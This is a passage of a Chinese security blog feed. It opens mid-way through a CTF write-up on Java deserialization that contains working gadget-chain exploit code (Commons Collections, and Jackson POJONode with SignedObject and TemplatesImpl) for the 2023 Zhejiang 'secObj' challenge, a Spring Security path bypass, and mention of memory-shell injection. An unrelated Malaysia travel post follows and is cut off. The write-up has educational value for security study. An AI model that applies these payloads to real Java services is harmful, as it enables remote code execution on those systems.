class="hljs-title class_">TiedMapEntry</span>(lazyMap, obj);<br><br><br>        HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;test&quot;</span>);<br>        lazyMap.remove(obj);<br><br>        setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesTohexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>        <span class="hljs-comment">//题目要求16进制</span><br>        <span class="hljs-keyword">if</span> (bytes == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-number">2</span> * bytes.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bytes.length; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0xF</span> &amp; bytes[i] &gt;&gt; <span class="hljs-number">4</span>;<br>            ret.append(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>.charAt(b));<br>            b = <span class="hljs-number">0xF</span> &amp; bytes[i];<br>            ret.append(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>.charAt(b));<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取exp的base64编码</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">tser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">toser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(tser);<br>        toser.writeObject(getObject());<br>        toser.close();<br><br>        String exp= Base64.getEncoder().encodeToString(tser.toByteArray());<br><br>        <span class="hljs-comment">//创建恶意的RMIConnector</span><br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span>+exp);<br>        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//使用InvokerTransformer 调用 connect 方法</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, rmiConnector);<br><br>        HashMap&lt;Object, Object&gt; expMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;test&quot;</span>);<br>        lazyMap.remove(rmiConnector);<br><br>        setFieldValue(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>, invokerTransformer);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeUTF(<span class="hljs-string">&quot;SJTU&quot;</span>);<br>        oos.writeInt(<span class="hljs-number">1896</span>);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        System.out.println(bytesTohexString(baos.toByteArray()));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在序列化的时候加入他的属性即可成功RCE</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125290.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="2023浙江省赛-secObj"><a href="#2023浙江省赛-secObj" class="headerlink" title="2023浙江省赛 secObj"></a>2023浙江省赛 secObj</h2><p>‍</p><p>考点：</p><ol><li>Spring Security 权限绕过(设计缺陷)</li><li>Java代码审计</li><li>‍</li></ol><p>‍</p><p>给了jar，看目录结构如下</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125463.png" alt="image">​</p><p>‍</p><h3 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h3><p>‍</p><p>配置文件是端口，发现存在SecurityConfig先看这个</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125604.png" alt="image">​</p><p>发现使用的<code>antMatcher</code>​的匹配方式并且后面并不是<code>/**</code>​直接随便绕过</p><p>因为在<code>antMatcher</code>​中  <code>/admin/*</code>​实际上只匹配一层资源，也就是只能匹配到<code>admin.do</code>​这样或者直接路由为<code>/admin</code>​这样</p><p>‍</p><p>但是很神奇的事情发生了，<code>admin</code>​仅仅是根路由，并不是直接映射的(我感觉是出题人设计缺陷吧)</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125763.png" alt="image">​</p><p>直接访问<code>/admin/user/hello</code>​即可</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125952.png" alt="image">​</p><p>‍</p><h3 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析"></a>审计分析</h3><p>其实有代码的就这个路由，传入一个data，使用自定义的反序列化写法进行反序列化</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125108.png" alt="image">​</p><p>跟进下<code>MyObjectInputStream</code>​，一样是重写了​<code>resolveClass</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125336.png" alt="image">​</p><p>禁用了这些关键字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blackList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;AbstractTranslet&quot;</span>, <span class="hljs-string">&quot;Templates&quot;</span>, <span class="hljs-string">&quot;TemplatesImpl&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;swing&quot;</span>, <span class="hljs-string">&quot;awt&quot;</span>, <span class="hljs-string">&quot;fastjson&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p>那么接下来就是来看怎么打反序列化了，存在以上黑名单而且发现只有一个jackson依赖可以利用，JDK自带的<code>TemplatesImpl</code>​也被过滤了，所以想到二次反序列化，那么问题就变成如何触发getter了</p><p>‍</p><h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>上面也讲到存在jackson关键依赖，所以我们就可以用jackson中的<code>POJONode</code>​来调用getter方法来触发SignedObject的二次反序列化</p><p>‍</p><p>但是这里遇到一个问题，二次打什么链呢？这里其实就是归结于如何调用getter的方法了，而这里的环境都是自带的jdk+spring，所以说多也不算多说少也不算少的方法，以下就写出方式的调用链(其实就是 1 2 3 排列组合为113 223 123这样子)，就写出一种EXP</p><p>‍</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#readObject() -&gt; HashMap#putVal() -&gt; HotSwappableTargetSource#equals() -&gt; XString#equals() -&gt; ToStringBean#toString() -&gt;POJONode#toString() -&gt; SignedObject#getObject() -&gt; BadAttributeValueExpException#readObject() -&gt; BaseJsonNode#toString() -&gt; TemplatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><p>‍</p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException#readObject() -&gt; ToStringBean#toString() -&gt;POJONode#toString() -&gt; SignedObject#getObject() -&gt; BadAttributeValueExpException#readObject() -&gt; BaseJsonNode#toString() -&gt; TemplatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><p>‍</p><h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#readObject() -&gt; HashMap#putVal() -&gt; HotSwappableTargetSource#equals() -&gt; XString#equals() -&gt; ToStringBean#toString() -&gt;POJONode#toString() -&gt; SignedObject#getObject() -&gt; HashMap#readObject() -&gt; HashMap#putVal() -&gt; HotSwappableTargetSource#equals() -&gt; XString#equals() -&gt; ToStringBean#toString() -&gt;POJONode#toString()  -&gt; TemplatesImpl#getOutputProperties()<br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> MenShell.SpringMemShell;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SignedObjectBAVEPoC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        POJONode po1= <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(templatesImpl));<br>        BadAttributeValueExpException ba1= <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(ba1,<span class="hljs-string">&quot;val&quot;</span>,po1);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>( ba1, privateKey, signingEngine);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(jsonNodes,<span class="hljs-string">&quot;_value&quot;</span>,signedObject);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(jsonNodes);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">hotSwappableTargetSource2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;1&quot;</span>));<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(barr.toByteArray());<br>        System.out.println(res);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templates);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="坑点-1"><a href="#坑点-1" class="headerlink" title="坑点"></a>坑点</h3><p>这里打过去的时候发现竟然报了403，可是就算没鉴权也应该是401才对</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125482.png" alt="image">​</p><p>其实这里返回403的原因实际上是<code>Spring Security</code>​默认会开启csrf验证，如果要手动关闭这个CSRF的校验需要写入以下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http.csrf().disable()<br></code></pre></td></tr></table></figure><p> 那么这里默认是开启的，所以我们需要去登录的接口处拿到我们的对应的Session+CSRFtoken才可以访问该路由</p><p>访问<code>/login</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125655.png" alt="image">​</p><p>得到结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">JSESSIONID=B2F26059AB6C4FF450F5CA7B8D1C9FDE;<br>_csrf=f25909d7-6384-4a3f-869e-9831e7f4de99<br></code></pre></td></tr></table></figure><p>然后带着Cookie+csrf就可以RCE了，接下来就是直接打内存马的事情了</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291125826.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随记 - 马来西亚攻略</title>
    <link href="/post/sui-ji-malaysia-raiders-1v4iqm.html"/>
    <url>/post/sui-ji-malaysia-raiders-1v4iqm.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在是2.17的凌晨五点20分，飞机三点下的，然后我爸开车送我到深圳的住处，现在毫无困意，于是写一下马来的攻略，可是当我打开我的拯救者的时候，MD发现放了5天在深圳就显示器坏了？？难道电脑也有水土不服？我初十就要实习了现在出这个妖蛾子，真裂开，立刻预约了明儿的联想售后看看先，这次是11号到16号5天6晚的行程，因为带着爸妈所以想着不这么特种兵，于是就选择了马来西亚的亚庇进行游玩，当时选择的是定制游(因为刚好亲戚是在携程工作的于是有点小关系吧)最后平均个人预算在后面说</p><p>‍</p><p>‍</p><h1 id="最终行程"><a href="#最终行程" class="headerlink" title="最终行程"></a>最终行程</h1><p>这是跟定制游那边一起协商好的行程，最终所有东西都完成打卡了，还不错</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436928.png" alt="0e09512004ecb0621454931333b810a">​</p><p>‍</p><h1 id="提前购置的物品"><a href="#提前购置的物品" class="headerlink" title="提前购置的物品"></a>提前购置的物品</h1><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 潜水服(我建议)<br>2. 潜水袜(非必须)<br>3. 潜水防晒(必须)<br>4. 潜水手机套(一定要，而且质量要保证，我买的手机套150，虽然贵了点，但是水下拍照真的清晰+稳定)<br>5. 马来西亚电话卡(我买的60一张，但是落地后在机场买才20RM一张，其实也够用)<br>6. 潜水的一次性咬嘴(其实吧我觉得入乡随俗，脏点也没事哈哈)<br>7. 晕船药 晕车药(晕船药一定一定一定要买，虽然我不晕船，但是我看见很多游客真的好EX)<br>8. 蚊怕水(可带可不带)<br></code></pre></td></tr></table></figure><p>‍</p><h1 id="停车注意事项"><a href="#停车注意事项" class="headerlink" title="停车注意事项"></a>停车注意事项</h1><p>开车去使用的是 <code>飞泊通</code>​ 小程序 代泊车</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436570.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436790.png" alt="image">​</p><p>‍</p><p>我看了下小红书等评论，说实话差评好评都有，我当时还是比较担心的，结果接车和送车服务都不错，师傅人也很好，而且我当时是凌晨3.半送车，也有师傅送车而去非常的准时，还是非常不错的，而且走的都是平台，也有了保障，我觉得还是比较推荐的</p><p>‍</p><h1 id="入境卡填写"><a href="#入境卡填写" class="headerlink" title="入境卡填写"></a>入境卡填写</h1><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436526.png" alt="image">​</p><p>需要在这里填写护照和入境的信息，然后会给你邮箱发电子入境卡，然后有一个Code，需要去官网确认输入你的Code后拿到PDF版的入境电子卡进行打印</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436843.png" alt="image">​</p><p>‍</p><h1 id="交通"><a href="#交通" class="headerlink" title="交通"></a>交通</h1><p>打车用的是<code>Grab</code>​(百分之百就是Grab)</p><p>地图使用高德or<code>Google Map</code>​</p><p>‍</p><p>‍</p><p>‍</p><h1 id="必去景点个人体验"><a href="#必去景点个人体验" class="headerlink" title="必去景点个人体验"></a>必去景点个人体验</h1><p>‍</p><ol><li><p>沙巴大学(emmm我觉得就那样吧，就是去打个卡)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436049.jpg" alt="613e20306ed538cafd9bd0c75a0e3c2">​</p></li><li><p>环滩岛潜水 深潜or浅潜(真的要去体验一下深潜，就是有一种尝鲜的感觉，那里的教练都非常nice，会一点普通话的)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436534.jpg" alt="832048de554266738ac78322359e829">​</p></li><li><p>天桥下榴莲街(一般吧，价格正常，我妈妈说挺好吃的榴莲，山竹10RM&#x2F;1kg，榴莲40RM&#x2F;1kg)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436014.jpg" alt="e1e60c86eb54267faf76867273593e4">​</p></li><li><p>加雅街(小吃确实多，但是感觉很像城市的美食节吧，卖的东西都差不多)</p></li><li><p>水上清真寺(勾八不给钱只能在外面拍照，说实话就是看建筑而已，其实没必要去)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436526.jpg" alt="7a8d62fd51d6682666f99d111fd2d25">​</p></li><li><p>丹亚绒路海滩(说实话，当天期待了蛮久的，没有小红书上说的全世界第三的落日这么玄乎)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436590.jpg" alt="35d4be96e204d9508afd07298b3c8db">​</p></li><li><p>美人鱼岛(蓝眼泪 + 拖尾沙滩)(很漂亮的沙滩，可以浮潜)</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436516.jpg" alt="5121f47a6cb72ea83209470fc8c52cd">​</p><p> <img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402171436404.jpg" alt="ad121b93dee3344c7bd1b8d7b4a69ed">​</p></li><li><p>红树林(monkey + 萤火虫)(主要是休闲吧 不过比较幸运的是跟P牛同一片彩虹了哈哈)</p><p> <img 